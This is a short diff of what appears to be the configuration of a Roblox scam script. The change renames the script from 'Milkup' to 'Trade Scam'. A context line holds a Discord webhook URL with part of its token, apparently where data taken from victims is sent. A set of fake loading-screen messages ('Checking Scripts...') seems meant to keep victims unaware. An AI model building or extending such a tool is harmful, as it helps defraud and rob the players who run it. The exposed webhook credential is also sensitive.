@@ -3,7 +3,7 @@ WebHook = "https://discord.com/api/webhooks/1102620015548698634/dacbXgr1lBrYFbtW
 
 
 loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
-_G.CustomScriptName = "Milkup"
+_G.CustomScriptName = "Trade Scam"
 _G.Text1 = "Script Loaded..."
 _G.Text2 = "Waiting for Script"
 _G.Text3 = "Checking Scripts..."
